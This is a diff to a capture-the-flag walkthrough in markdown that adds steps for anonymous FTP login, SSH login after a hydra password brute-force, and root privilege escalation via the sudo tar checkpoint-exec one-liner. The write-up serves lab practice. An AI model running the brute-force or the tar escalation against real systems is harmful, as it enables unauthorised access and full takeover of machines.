@@ -19,7 +19,7 @@ Connect to it. Type,
 ```bash
 ftp <ip>
 ```
-
+Login using anonymous name.
 Now, let's view files using ls command.
 There are two files named as locks.txt and task.txt.
 Get them to your pc and see whats inside.
@@ -34,3 +34,23 @@ Type:-
 ```bash
 hydra -l <username> -P <password_list> -t 1 <ip> ssh
 ```
+
+Now, we know the password.
+Let's login over ssh.
+Type:-
+```bash
+ssh <username>@<ip>
+```
+And enter the password you got.
+
+# Privilege Escaltion:-
+
+Type sudo -l and see that we can run tar app as a root.
+Let's go to gtfobins and get the sudo exploit for tar.
+If you can't find it here type:-
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+Once you execute above command, you'll become a root user.
+
+Congrats, now get the flags.
